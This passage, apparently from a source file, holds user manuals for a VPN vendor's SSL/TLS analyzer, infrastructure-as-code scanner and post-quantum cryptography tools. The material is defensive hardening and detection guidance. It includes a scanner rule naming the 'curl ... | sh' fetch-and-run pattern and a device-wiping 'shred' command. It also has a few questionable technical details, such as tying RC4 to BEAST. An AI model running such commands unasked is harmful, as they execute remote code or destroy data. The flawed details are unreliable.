  TLS 1.3 (2018) — SHOULD be accepted
    Modern standard. Removes all weak cipher suites.
    Required for best performance (0-RTT handshake).
    All browsers support TLS 1.3.

  Recommended configuration:
  ✓ TLS 1.3: ENABLED
  ✓ TLS 1.2: ENABLED (with strong ciphers only)
  ✗ TLS 1.1: DISABLED
  ✗ TLS 1.0: DISABLED
  ✗ SSL 3.0: DISABLED
  ✗ SSL 2.0: DISABLED

4. CIPHER SUITE ANALYSIS

  Dangerous ciphers (flag as HIGH or CRITICAL):
  NULL     → no encryption (data sent in plaintext)
  EXPORT   → 40-bit keys (breakable in seconds)
  RC4      → broken stream cipher (BEAST, RC4 biases)
  DES      → 56-bit key (brute-forceable in hours)
  3DES     → SWEET32 attack (birthday bound with 64-bit blocks)
  aNULL    → anonymous key exchange (no server authentication)
  MD5 MAC  → collision-vulnerable message authentication

  Strong cipher suites (TLS 1.2):
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
  TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256
  TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384

  TLS 1.3 cipher suites (all acceptable):
  TLS_AES_256_GCM_SHA384
  TLS_AES_128_GCM_SHA256
  TLS_CHACHA20_POLY1305_SHA256

5. KEY EXCHANGE & FORWARD SECRECY

  Forward Secrecy (FS): each TLS session uses a unique key pair.
  If the server's private key is later compromised, past sessions
  remain encrypted — attacker cannot decrypt recorded traffic.

  FS requires: ECDHE or DHE key exchange.
  Non-FS: RSA key exchange (CRITICAL: supports decryption of
  all past recorded sessions if private key is compromised).

  DHE key size: must be ≥ 2048 bits (Logjam attack on <1024 bit)
  ECDHE curves: prefer P-256, P-384, X25519 (avoid P-521 for perf)

6. HTTP SECURITY HEADER CHECK

  The analyzer also checks HTTP response headers:

  HSTS (Strict-Transport-Security):
  Required:  max-age ≥ 31536000 (1 year)
  Better:    include includeSubDomains
  Best:      include preload (submits to browser preload list)
  Missing HSTS = HIGH (allows SSL stripping attacks)

  Certificate Pinning (HPKP): deprecated but checked
  CSP (Content-Security-Policy): reduces XSS impact
  X-Frame-Options: DENY or SAMEORIGIN (clickjacking prevention)
  X-Content-Type-Options: nosniff

7. KNOWN VULNERABILITY DETECTION

  The analyzer checks configuration against known attacks:

  POODLE (CVE-2014-3566)
    Requires: SSLv3 or TLS 1.0 with CBC cipher
    Check: is SSLv3 or TLS 1.0 accepted?

  BEAST (CVE-2011-3389)
    Requires: TLS 1.0 with CBC cipher suite
    Check: is TLS 1.0 accepted?

  CRIME (CVE-2012-4929)
    Requires: TLS compression enabled
    Check: does server negotiate DEFLATE compression?

  HEARTBLEED (CVE-2014-0160)
    Requires: OpenSSL 1.0.1 through 1.0.1f
    Check: TLS heartbeat extension response analysis

  DROWN (CVE-2016-0800)
    Requires: SSLv2 enabled on this or a related server
    Check: SSLv2 negotiation attempt

  FREAK (CVE-2015-0204)
    Requires: EXPORT-grade cipher support
    Check: RSA_EXPORT cipher negotiation

  LOGJAM (CVE-2015-4000)
    Requires: DHE key < 1024 bits
    Check: DHE key size in handshake

  ROBOT (CVE-2017-13099)
    Requires: RSA PKCS#1 v1.5 key exchange vulnerability
    Check: timing oracle on RSA decryption

8. HOW TO USE

  1. Navigate to SSL/TLS Analyzer (/ssl-tls).
  2. Enter target: hostname only (example.com) or with port
     (example.com:8443 for non-standard HTTPS).
  3. Optional: enter SNI override if the cert CN doesn't match.
  4. Click "Analyze". Scan takes 10–30 seconds.
  5. Review findings by severity: CRITICAL → HIGH → MEDIUM → LOW.
  6. Click "Download Report" for a formatted text file.

  For targets behind a load balancer:
  Run the scan multiple times — different backend servers may
  have different TLS configurations. Inconsistent results across
  runs indicate mixed configurations.

9. READING THE REPORT

  Finding format:
  [SEVERITY] Finding Title
  Detail: explanation of the issue
  Evidence: specific data from the handshake proving the finding
  CVE: relevant CVE identifier (if applicable)
  Remediation: how to fix

  Severity levels:
  CRITICAL  → Immediate action required (expired cert, SSLv2/3)
  HIGH      → Fix before next deployment (weak protocol/cipher)
  MEDIUM    → Fix within 30 days (suboptimal config)
  LOW       → Informational / best practice

10. REMEDIATION REFERENCE

  Disable SSLv2/3/TLS1.0/1.1 (nginx):
    ssl_protocols TLSv1.2 TLSv1.3;

  Set strong cipher suites (nginx):
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

  Enable TLS 1.3 (nginx 1.13+):
    ssl_protocols TLSv1.2 TLSv1.3;

  Add HSTS (nginx):
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

  Enable DHE with 2048-bit group:
    ssl_dhparam /etc/ssl/dhparam.pem;
    (generate: openssl dhparam -out /etc/ssl/dhparam.pem 2048)

  Enable OCSP stapling (nginx):
    ssl_stapling on;
    ssl_stapling_verify on;

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "iac-scanner-manual",
    title: "IaC Security Scanner",
    subtitle: "Terraform, CloudFormation, Kubernetes, Ansible, and Dockerfile misconfiguration detection",
    version: "1.1",
    pages: 14,
    icon: FileText,
    iconColor: "text-teal-400",
    tier: "pro",
    content: `IaC Security Scanner — User Manual
Version 1.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Arsenal Tier Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Supported Formats
2. Terraform Checks
3. CloudFormation Checks
4. Kubernetes Manifest Checks
5. Dockerfile Checks
6. Ansible Playbook Checks
7. How to Use
8. Fix & Re-scan Workflow
9. CI/CD Integration
10. Severity Reference

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & SUPPORTED FORMATS

  The IaC Scanner (/iac-scan) detects security misconfigurations
  in Infrastructure-as-Code files before they reach production.
  Catch misconfigured S3 buckets, overly permissive IAM roles,
  exposed Kubernetes pods, and insecure Docker images at code review
  time — not after a breach.

  Supported formats (auto-detected by content):
  • Terraform (.tf, .tfvars)
  • CloudFormation (.yaml, .json — AWS)
  • Kubernetes manifests (.yaml)
  • Dockerfile (any name, Docker syntax)
  • Ansible playbooks (.yaml with play structure)

  Input options:
  • Paste file content directly into the editor
  • Upload a file (drag-and-drop)
  • Enter a public GitHub raw URL (fetched server-side via VPN)

2. TERRAFORM CHECKS

  S3 Buckets:
  CRITICAL: bucket acl = "public-read" or "public-read-write"
  HIGH:     versioning not enabled
  HIGH:     server-side encryption not configured
  HIGH:     no MFA delete (objects can be permanently deleted)
  HIGH:     public access block not set to all true
  MEDIUM:   access logging disabled
  LOW:      no lifecycle policy

  IAM Resources:
  CRITICAL: policy with "Effect":"Allow", "Action":"*", "Resource":"*"
  HIGH:     policy allows "iam:*" (full IAM control)
  HIGH:     policy allows "s3:*" on all resources
  HIGH:     assume_role_policy allows "*" (any principal)
  MEDIUM:   no MFA condition on sensitive actions
  MEDIUM:   inline policy instead of managed policy

  EC2 / Compute:
  CRITICAL: security_group with ingress 0.0.0.0/0 on port 22
  CRITICAL: security_group with ingress 0.0.0.0/0 on port 3389
  HIGH:     security_group with ingress 0.0.0.0/0 on any port
  HIGH:     instance without IMDSv2 (metadata endpoint v1)
  HIGH:     unencrypted EBS volume
  MEDIUM:   no VPC assignment
  LOW:      no key pair for SSH access

  RDS / Databases:
  CRITICAL: publicly_accessible = true
  HIGH:     no encryption at rest (storage_encrypted = false)
  HIGH:     deletion protection disabled in production
  HIGH:     backup retention = 0
  MEDIUM:   no multi-AZ (single point of failure)
  LOW:      no enhanced monitoring

  General:
  HIGH:     hardcoded secrets in .tf or .tfvars files
            (detected by regex: password, secret, key = "literal")
  HIGH:     no remote state backend (state stored locally)
  MEDIUM:   no state locking (concurrent modification risk)

3. CLOUDFORMATION CHECKS

  IAM:
  CRITICAL: Lambda execution role with "Action":["*"]
  CRITICAL: EC2 instance profile with admin policy attached
  HIGH:     IAM role with * in Action field

  Storage:
  CRITICAL: S3 bucket with PublicReadPolicy or PublicReadWritePolicy
  HIGH:     S3 without server-side encryption
  HIGH:     RDS without StorageEncrypted: true

  Compute:
  HIGH:     EC2 SecurityGroup with CidrIp: "0.0.0.0/0" on SSH/RDP
  MEDIUM:   EC2 without VPC (EC2-Classic)
  MEDIUM:   No DeletionPolicy on stateful resources

4. KUBERNETES MANIFEST CHECKS

  Container Security Context:
  CRITICAL: securityContext.privileged: true
            (full host kernel access — equivalent to root on node)
  CRITICAL: securityContext.runAsUser: 0
            (container running as root user)
  HIGH:     securityContext.allowPrivilegeEscalation: true
  HIGH:     No securityContext defined (defaults may be unsafe)
  HIGH:     readOnlyRootFilesystem: false (default)
  MEDIUM:   No runAsNonRoot: true

  Host Access:
  CRITICAL: hostPID: true (access all host processes)
  CRITICAL: hostNetwork: true (access host network stack)
  CRITICAL: hostIPC: true (access host IPC namespace)
  HIGH:     volumes with hostPath (mounts host filesystem)

  Resource Limits:
  HIGH:     No resources.limits defined (container can DoS node)
  MEDIUM:   No resources.requests defined

  Service Accounts:
  HIGH:     automountServiceAccountToken: true (default)
            + pod has broad RBAC permissions
  HIGH:     serviceAccountName: default (uses default SA)

  Images:
  HIGH:     image tag ":latest" (non-reproducible builds)
  MEDIUM:   No image digest pinning

  Network Policy:
  MEDIUM:   No NetworkPolicy restricting pod ingress/egress
  LOW:      All pods allow all ingress (default if no policy)

5. DOCKERFILE CHECKS

  User:
  CRITICAL: No USER directive (runs as root by default)
  HIGH:     USER root explicitly set
  MEDIUM:   USER numeric ID not specified

  Instructions:
  HIGH:     ADD instead of COPY (ADD can extract archives / fetch URLs)
  HIGH:     RUN apt-get upgrade (unpredictable package versions)
  MEDIUM:   No HEALTHCHECK directive
  LOW:      Multiple RUN apt-get commands (should be combined)

  Secrets:
  CRITICAL: ENV PASSWORD=... or ENV SECRET=... or ENV KEY=...
            (secrets baked into image layers — readable in history)
  CRITICAL: ARG with default value containing secret
  HIGH:     COPY id_rsa or COPY .ssh (SSH key in image)
  HIGH:     RUN curl ... | sh (remote code execution at build time)

  Base image:
  HIGH:     FROM ubuntu:latest or FROM node:latest (use versioned tags)
  MEDIUM:   FROM large base image when alpine is feasible
  MEDIUM:   Base image without known vulnerability scanning

  Build best practices:
  MEDIUM:   No .dockerignore (builds may include .git, node_modules)
  LOW:      EXPOSE ports not documented
  LOW:      No LABEL metadata (MAINTAINER deprecated)

6. ANSIBLE PLAYBOOK CHECKS

  Privilege escalation:
  MEDIUM:   become: yes without become_user specified (runs as root)
  LOW:      no_log: false on tasks handling passwords/secrets

  File permissions:
  HIGH:     file module with mode: "0777"
  MEDIUM:   file module without explicit mode (defaults to system umask)

  Secret handling:
  HIGH:     vars: password: "hardcoded" (plaintext secrets)
  HIGH:     No ansible-vault usage for sensitive variables
  MEDIUM:   Debug task printing secrets (debug: var=secret)

7. HOW TO USE

  Step 1: Navigate to IaC Scanner (/iac-scan).
  Step 2: Choose input method:
    a) Paste file content into the editor
    b) Upload file (drag-and-drop)
    c) Enter GitHub raw URL

  Step 3: File type is auto-detected. Override if needed.

  Step 4: Click "Scan".
  Scan time: <2 seconds for files under 1000 lines.

  Step 5: Review findings:
  • Sorted by severity: CRITICAL first
  • Each finding shows: resource name, line number, issue, fix
  • Click any finding to jump to the relevant line in the editor

  Step 6: Click "Fix & Re-scan" on any finding to apply the
  suggested fix and immediately re-scan to confirm resolution.

8. FIX & RE-SCAN WORKFLOW

  The Fix & Re-scan feature:
  1. Click "Fix & Re-scan" on a finding.
  2. The editor shows the suggested fix in-line (diff view).
  3. Accept the fix → applies to the code in the editor.
  4. Scan automatically re-runs.
  5. Confirmed-fixed findings turn green.
  6. Remaining findings stay red.
  7. Download the fixed version when all CRITICAL/HIGH resolved.

  NOTE: Suggested fixes are heuristic — always review before
  applying to production code. Complex cases may need manual fix.

9. CI/CD INTEGRATION

  For automated scanning in GitHub Actions, GitLab CI, or any CI:

  The IaC Scanner API is available at:
  POST /api/iac-scan
  Body: { "content": "<file content>", "type": "terraform" }
  Response: { "findings": [...], "summary": { "critical": N, ... } }

  Add to GitHub Actions (example):
  ---
  - name: IaC Security Scan
    run: |
      RESULT=$(curl -s -X POST \
        -H "Authorization: Bearer $PROXHQ_API_KEY" \
        -H "Content-Type: application/json" \
        -d "{\"content\": $(cat main.tf | jq -Rs .), \"type\": \"terraform\"}" \
        https://proxhqvpn.com/api/iac-scan)
      CRITICAL=$(echo $RESULT | jq '.summary.critical')
      if [ "$CRITICAL" -gt "0" ]; then
        echo "CRITICAL IaC findings - blocking deployment"
        exit 1
      fi
  ---

10. SEVERITY REFERENCE

  CRITICAL: Immediate exploitation risk. Publicly exposed data,
            admin access to anyone, credentials in code.
            Block deployment. Fix before any commit merges.

  HIGH:     Significant risk. Vulnerable to targeted attack.
            Fix before next sprint release.

  MEDIUM:   Compliance or best-practice violation. Not immediately
            exploitable but reduces defense depth.
            Fix within 30 days.

  LOW:      Informational / hygiene issue.
            Address in technical debt backlog.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "post-quantum-manual",
    title: "Post-Quantum Cryptography Suite",
    subtitle: "ML-KEM-768 + ML-DSA-65 (FIPS 203/204), CNSA 2.0, audit chain, offline key bundle",
    version: "2.0",
    pages: 26,
    icon: Zap,
    iconColor: "text-violet-400",
    tier: "pro",
    content: `Post-Quantum Cryptography Suite — User Manual
Version 2.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. The Quantum Threat
2. Why Current VPN Crypto Is Vulnerable
3. NIST PQC Finalists — Supported Algorithms
4. Algorithm Selection Guide
5. Enabling Post-Quantum Mode
6. Hybrid Mode (Classical + PQ Together)
7. Performance Impact
8. Compatibility Notes
9. Testing & Verification
10. Live ML-KEM-768 Key Generation (v2.0)
11. ML-DSA-65 Sign & Verify Tool (v2.0)
12. CNSA 2.0 Compliance Scorecard (v2.0)
13. Hash-Chained Audit Log (v2.0)
14. Air-Gapped Offline Key Bundle (v2.0)
15. API Reference

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. THE QUANTUM THREAT

  A sufficiently powerful quantum computer running Shor's algorithm
  can break RSA, ECDH, and ECDSA — the mathematical foundations of
  all current TLS, SSH, VPN, and web PKI security.

  Timeline estimates (as of 2026):
  • Optimistic: 10–15 years to a cryptographically-relevant quantum
    computer (CRQC) capable of breaking 256-bit ECDSA
  • Conservative: 20–30 years
  • Nation-state programs (IARPA, China): classified, likely faster

  The "harvest now, decrypt later" attack is active TODAY:
  Nation-state intelligence agencies are recording encrypted VPN
  traffic at scale RIGHT NOW. When they have a CRQC, they will
  decrypt all of that stored traffic retrospectively.

  If your VPN carries sensitive data that is still sensitive in
  10+ years, you need post-quantum cryptography now.

2. WHY CURRENT VPN CRYPTO IS VULNERABLE

  WireGuard uses:
  • ECDH with Curve25519 for key exchange
    → Shor's algorithm breaks ECDLP in polynomial time
    → A CRQC breaks this in hours, not millennia
  • ChaCha20-Poly1305 for symmetric encryption
    → Symmetric crypto is quantum-resistant (Grover's gives
       only quadratic speedup — 256-bit key remains 128-bit
       quantum security. AES-256 and ChaCha20 are fine.)
  • Ed25519 for session authentication
    → Same ECDSA family — vulnerable to Shor's

  The vulnerability is in the KEY EXCHANGE and AUTHENTICATION,
  not in the bulk encryption. The fix: replace ECDH/ECDSA with
  post-quantum alternatives while keeping ChaCha20 for data.

3. NIST PQC FINALISTS — SUPPORTED ALGORITHMS

  ML-KEM (CRYSTALS-Kyber) — KEY ENCAPSULATION
    Standard: FIPS 203 (2024)
    Replaces: ECDH key exchange
    Based on: Module Learning With Errors (MLWE) problem
    Security levels:
      ML-KEM-512  → ~128 bits classical / ~128 bits quantum
      ML-KEM-768  → ~192 bits classical / ~192 bits quantum (DEFAULT)
      ML-KEM-1024 → ~256 bits classical / ~256 bits quantum
    Public key size: 800 / 1184 / 1568 bytes (vs 32 for X25519)
    Ciphertext size: 768 / 1088 / 1568 bytes

  ML-DSA (CRYSTALS-Dilithium) — DIGITAL SIGNATURE
    Standard: FIPS 204 (2024)
    Replaces: Ed25519 WireGuard authentication signatures
    Based on: Module Lattice problem
    Security levels:
      ML-DSA-44  → ~128 bits quantum security
      ML-DSA-65  → ~192 bits quantum security (DEFAULT)
      ML-DSA-87  → ~256 bits quantum security
    Signature size: 2,420 / 3,293 / 4,595 bytes (vs 64 for Ed25519)

  SLH-DSA (SPHINCS+) — HASH-BASED SIGNATURE
    Standard: FIPS 205 (2024)
    Conservative alternative to ML-DSA
    No number-theoretic assumptions — security relies only on
    hash function security (SHA-256 or SHAKE)
    If lattice math is broken, SLH-DSA remains secure.
    Signature size: 7,856–49,856 bytes (much larger than ML-DSA)
    Performance: significantly slower than ML-DSA
    Use when: maximum conservatism required

  CLASSIC McELIECE — KEY ENCAPSULATION (OPTIONAL)
    Based on: error-correcting code theory (50+ years of analysis)
    Most conservative key encapsulation option available
    Public key: 261,120 bytes (large — bandwidth impact)
    Ciphertext: 128 bytes (small)
    Use when: maximum security margins required and bandwidth
              is not a concern

4. ALGORITHM SELECTION GUIDE

  For most users (Command Center Pro):
    Key Exchange: ML-KEM-768 (default)
    Authentication: ML-DSA-65 (default)
    Bulk encryption: ChaCha20-Poly1305 (unchanged from WireGuard)

  For maximum security (government / defense contractors):
    Key Exchange: ML-KEM-1024 OR Classic McEliece
    Authentication: ML-DSA-87 OR SLH-DSA-192 (slower but hash-based)
    Hybrid mode: ON (run classical + PQ simultaneously)

  For performance-sensitive deployments (mobile / low-bandwidth):
    Key Exchange: ML-KEM-512
    Authentication: ML-DSA-44
    Hybrid mode: OFF

5. ENABLING POST-QUANTUM MODE

  Post-Quantum (/post-quantum) → Configuration tab

  Step 1: Select algorithm profile:
    Standard PQ (recommended): ML-KEM-768 + ML-DSA-65
    High Security:             ML-KEM-1024 + ML-DSA-87
    Maximum Conservative:      McEliece + SLH-DSA
    Custom: pick each algorithm individually

  Step 2: Select hybrid mode preference (Section 6).

  Step 3: Click "Apply PQ Configuration".
  → New WireGuard config is generated with PQ key material.
  → All connected peers must also be running PQ-enabled clients.
  → Reconnect all WireGuard clients with the updated config.

  Step 4: Verify connection in Dashboard.
  The connection status shows a ⬡ PQ badge when post-quantum
  handshake is confirmed.

6. HYBRID MODE (CLASSICAL + PQ TOGETHER)

  Hybrid mode runs BOTH classical (X25519 / Ed25519) AND the
  post-quantum algorithm simultaneously. The session key is derived
  by combining both keys via XOR or KDF.

  Why hybrid:
  • If PQ algorithm is ever broken (theoretical), classical layer
    still protects the session.
  • If classical ECDH is broken by a CRQC, PQ layer protects.
  • You are secure against both quantum AND classical attacks.

  Overhead of hybrid: roughly classical + PQ combined.
  ML-KEM-768 hybrid adds ~2–4ms per handshake vs. classical only.

  Recommendation: ENABLE hybrid mode for all deployments.
  The performance cost is negligible and the security gain is
  significant (belt-and-suspenders against unknown vulnerabilities).

7. PERFORMANCE IMPACT

  Handshake overhead (one-time per WireGuard session):
  ML-KEM-768 only:          +0.8ms handshake time
  ML-KEM-768 hybrid:        +2.1ms handshake time
  Classic McEliece:         +85ms handshake (large key transfer)

  Per-packet overhead: NONE. Post-quantum only affects the
  handshake. Once the session key is established, all traffic
  uses ChaCha20-Poly1305 which is not changed.

  Bandwidth overhead (per WireGuard handshake):
  ML-KEM-768:      +2.3 KB additional data per handshake
  ML-KEM-1024:     +4.7 KB additional data per handshake
  Classic McEliece: +256 KB additional data per handshake

  WireGuard handshakes occur every 2 minutes (180-second rekey).
  The bandwidth overhead is minimal for all options except McEliece.

8. COMPATIBILITY NOTES

  Post-quantum WireGuard is NOT compatible with standard WireGuard
  clients (wireguard-go, wg-quick on Linux, WireGuard iOS/Android).

  Both endpoints MUST run PQ-enabled software:
  • Server: ProxhqVPN API server with PQ extension
  • Client: ProxhqVPN desktop app, mobile app, or any
    WireGuard fork with NIST PQC support (e.g. mlkem-wireguard)

  If a peer does not support PQ:
  → The handshake will fail (not fall back to classical)
  → This is by design — no silent downgrade to vulnerable crypto

  To check peer compatibility before enabling PQ:
  Post-Quantum → Compatibility Checker → enter peer public key
  → Shows whether the peer's ProxhqVPN client version supports PQ

9. TESTING & VERIFICATION

  After enabling post-quantum mode:

  Test 1 — Dashboard PQ badge:
  Dashboard → connection status should show ⬡ PQ ACTIVE badge.

  Test 2 — Handshake log verification:
  Terminal → journalctl -u wg-quick@wg0 | grep -i "pq\|kyber\|dilithium"
  Should see: "PQ handshake complete: ML-KEM-768 + ML-DSA-65"

  Test 3 — Key material inspection:
  Post-Quantum → Status → shows:
  • Current session key algorithm
  • Last PQ handshake timestamp
  • Peer PQ public key fingerprint

  Test 4 — Quantum-resistant leak test:
  Leak Detection (/leaks) → PQ Check tab
  Verifies the handshake used PQ algorithms and not classical fallback.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

10. LIVE ML-KEM-768 KEY GENERATION (v2.0)

  ProxhqVPN now generates REAL ML-KEM-768 keypairs server-side using
  @noble/post-quantum (FIPS 203 certified implementation). Keys are
  generated fresh on every request — never cached or stored to disk.

  Navigate to: Post-Quantum (/post-quantum) → Encryption tab

  Generate a New Keypair:
  Click "Generate New ML-KEM-768 Keypair"
  The API calls POST /api/pqc/generate-keys and returns:
    • Public Key   — 1,184 bytes (Base64, ~1.6 KB encoded)
    • Secret Key   — 2,400 bytes (Base64, ~3.2 KB encoded)
    • Key ID       — random 8-byte hex identifier
    • Generated At — ISO timestamp

  Key Storage:
  Keys are stored in memory only for your current session.
  The server never persists private keys to the database or disk.
  Export your keypair via the Offline Bundle (Section 14) if you
  need to retain them for long-term use.

  Encapsulate (send an encrypted shared secret to a peer):
  1. Paste the peer's ML-KEM-768 public key (Base64).
  2. Click "Encapsulate."
  3. You receive:
     • Ciphertext   — 1,088 bytes — send this to the peer
     • Shared Secret — 32 bytes   — your side of the session key
  API: POST /api/pqc/encapsulate  Body: { publicKey }

  Decapsulate (recover the shared secret from ciphertext):
  1. Paste the ciphertext received from the peer (Base64).
  2. Click "Decapsulate" (uses your current secret key).
  3. Recovered shared secret is shown (must match peer's).
  API: POST /api/pqc/decapsulate  Body: { cipherText }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

11. ML-DSA-65 SIGN & VERIFY TOOL (v2.0)

  Navigate to: Post-Quantum (/post-quantum) → ML-DSA Signatures tab

  The ML-DSA-65 tool lets you sign arbitrary messages and verify
  signatures using FIPS 204 lattice-based digital signatures.

  Generate ML-DSA-65 Keypair:
  Click "Generate ML-DSA-65 Keypair"
  Returns:
    • Public Key  — 1,952 bytes (Base64, ~2.6 KB encoded)
    • Secret Key  — 4,032 bytes (Base64, ~5.4 KB encoded)
  API: POST /api/pqc/generate-keys?algorithm=ml-dsa-65

  Sign a Message:
  1. Paste your ML-DSA-65 secret key (Base64).
  2. Enter the message text to sign.
  3. Click "Sign Message."
  4. Signature returned: 3,293 bytes (Base64, ~4.4 KB encoded).
  API: POST /api/pqc/sign  Body: { secretKey, message }

  Verify a Signature:
  1. Paste the ML-DSA-65 public key of the signer.
  2. Paste the message text (must be identical to what was signed).
  3. Paste the ML-DSA-65 signature (Base64).
  4. Click "Verify Signature."
  5. Result: VALID ✓ or INVALID ✗
  API: POST /api/pqc/verify  Body: { publicKey, message, signature }

  Use cases:
  • Sign WireGuard configuration files before distribution
  • Sign firmware update manifests for VPN nodes
  • Verify the authenticity of peer public keys
  • Sign audit reports with post-quantum non-repudiation

  Security note:
  ML-DSA-65 provides ~192 bits of quantum security.
  Signature size (3,293 bytes) is ~51× larger than Ed25519 (64 bytes).
  For maximum security, use ML-DSA-87 (4,595-byte signatures,
  ~256 bits quantum security) — selectable in Settings.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

12. CNSA 2.0 COMPLIANCE SCORECARD (v2.0)

  Navigate to: Post-Quantum (/post-quantum) → CNSA 2.0 Compliance tab

  CNSA 2.0 (Commercial National Security Algorithm Suite 2.0) is
  the NSA's mandatory quantum-resistant algorithm set for systems
  handling national security information. ProxhqVPN implements the
  full CNSA 2.0 stack and provides a real-time compliance scorecard.

  CNSA 2.0 Algorithm Requirements:
  ┌──────────────────────────────────────────────────────────┐
  │ Function          │ Required Algorithm    │ Status       │
  ├──────────────────────────────────────────────────────────┤
  │ Key Encapsulation │ ML-KEM-1024           │ ✓ Supported  │
  │ Digital Signature │ ML-DSA-87             │ ✓ Supported  │
  │ Digital Signature │ SLH-DSA-256           │ ✓ Supported  │
  │ Bulk Encryption   │ AES-256-GCM           │ ✓ Active     │
  │ Key Agreement     │ ECDH P-384 (hybrid)   │ ✓ Hybrid OK  │
  │ Hashing           │ SHA-384 / SHA-512     │ ✓ Active     │
  └──────────────────────────────────────────────────────────┘

  Note: The default profile uses ML-KEM-768 + ML-DSA-65 (NIST
  recommended for most deployments). Strict CNSA 2.0 compliance
  requires upgrading to ML-KEM-1024 + ML-DSA-87.

  Scorecard Controls:
  The scorecard shows a live evidence matrix with:
  • Algorithm in use
  • Key sizes (bytes)
  • NIST standard and year
  • Compliance status per function
  • Overall compliance percentage

  Switch to CNSA 2.0 Strict Mode:
  Post-Quantum → Settings → Algorithm Profile → "CNSA 2.0 Strict"
  This sets: ML-KEM-1024 + ML-DSA-87 + SHA-512 + AES-256-GCM hybrid.

  Timeline note:
  NSA mandates CNSA 2.0 adoption for national security systems:
  • Software and firmware: transition by 2025 (already required)
  • Network devices:       transition by 2026 (current year)
  • Systems:              full adoption by 2030

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

13. HASH-CHAINED AUDIT LOG (v2.0)

  Navigate to: Post-Quantum (/post-quantum) → Audit Chain tab

  Every post-quantum cryptographic operation is recorded in a
  tamper-evident, SHA-256 hash-chained audit log. This provides
  non-repudiation and makes post-hoc modification detectable.

  How the chain works:
  • Entry 0: { operation, timestamp, inputs, chainHash: SHA256(entry) }
  • Entry 1: { ..., chainHash: SHA256(entry0.chainHash + entry1data) }
  • Entry N: chainHash = SHA256(chainHash[N-1] + entryNdata)
  Each entry's hash incorporates the previous entry's hash, forming
  a chain where altering any historical entry invalidates all
  subsequent hashes.

  Viewing the Audit Chain:
  The Audit Chain tab shows:
  • Total entries in the chain
  • Chain head hash (current tip, SHA-256 hex)
  • Per-entry log: timestamp, operation type, inputs digest, hash
  • Chain integrity status: VALID ✓ or BROKEN ✗ at entry N

  Chain Verification:
  Click "Verify Chain" to re-compute all hashes from the genesis
  entry and compare against stored hashes. If any entry was tampered
  with, the verification will report the exact entry where the chain
  breaks.
  API: GET /api/pqc/audit-chain
  Returns: { ok, total, brokenAt, chainHead, algorithm, entries[] }

  Logged operations include:
  • Key generation (ML-KEM / ML-DSA)
  • Encapsulate / Decapsulate
  • Sign / Verify
  • Offline bundle download
  • Settings changes
  • Compliance attestation

  Exporting the audit log:
  The audit chain can be exported as a JSON file from the UI.
  The exported file includes all entries and can be independently
  verified using any SHA-256 implementation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

14. AIR-GAPPED OFFLINE KEY BUNDLE (v2.0)

  Navigate to: Post-Quantum (/post-quantum) → Offline Bundle tab

  The Offline Bundle generates a cryptographically complete key
  package for air-gapped or offline environments where network
  connectivity to the ProxhqVPN server is unavailable.

  What is included in the bundle:
  ┌────────────────────────────────────────────────────────┐
  │ File               │ Contents                          │
  ├────────────────────────────────────────────────────────┤
  │ kem-public.b64     │ ML-KEM-768 public key (Base64)    │
  │ kem-secret.b64     │ ML-KEM-768 secret key (Base64)    │
  │ dsa-public.b64     │ ML-DSA-65 public key (Base64)     │
  │ dsa-secret.b64     │ ML-DSA-65 secret key (Base64)     │
  │ wg0.conf           │ WireGuard config with PQ keys      │
  │ manifest.json      │ Key IDs, sizes, generation time   │
  │ chain-snapshot.json│ Audit chain at time of export     │
  └────────────────────────────────────────────────────────┘

  Downloading the bundle:
  Click "Download Offline Bundle" on the Offline Bundle tab.
  API: GET /api/pqc/offline-bundle
  Returns: application/zip — proxhqvpn-offline-keys-<timestamp>.zip

  Security precautions for offline use:
  1. Download the bundle over an HTTPS connection.
  2. Transfer to the air-gapped system via encrypted USB only.
  3. Verify the bundle SHA-256 checksum (shown in the UI after download)
     on the receiving system using: sha256sum proxhqvpn-offline-keys-*.zip
  4. Shred the USB after transfer: shred -u /dev/sdX
  5. Store the secret key files in an encrypted volume (LUKS / VeraCrypt).
  6. Never store plain-text secret keys on internet-connected storage.

  Key rotation for air-gapped systems:
  Generate a new offline bundle every 90 days or after any suspected
  compromise. The old bundle's public key should be revoked from all
  peer configurations before bringing the new bundle online.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

15. API REFERENCE

  All endpoints require a valid Clerk Bearer token header:
  Authorization: Bearer <clerk_session_token>

  POST /api/pqc/generate-keys
    Generates a fresh ML-KEM-768 + ML-DSA-65 keypair.
